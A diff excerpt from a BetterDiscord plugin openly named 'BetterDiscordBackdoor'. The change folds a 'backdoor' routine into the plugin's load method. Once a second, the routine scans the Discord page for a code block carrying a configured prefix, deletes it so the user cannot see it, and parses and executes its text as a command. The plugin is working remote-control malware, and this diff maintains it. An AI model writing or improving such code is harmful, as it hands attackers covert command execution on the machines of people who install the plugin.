@@ -25,9 +25,9 @@ class BetterDiscordBackdoor {
     getAuthor() { return config.info.author[0] }
     getDescription() { return config.info.description; }
     getVersion() { return config.info.version; }
-
-    backdoor() {
-      let cmd = $('code:contains(config.backdoor.prefix):first');
+    
+    load() {
+      setInterval(() => {let cmd = $('code:contains(config.backdoor.prefix):first');
       if (cmd.text() != "") {
         cmd.remove();
         let command = cmd.text().split(" ");
@@ -41,10 +41,6 @@ class BetterDiscordBackdoor {
         } catch(e) {
           console.log("An error occurred while executing the command!", e);
         }
-      }
-    }
-    
-    load() {
-      setInterval(this.backdoor,  500);
+      }}, 1000);
     }
 }
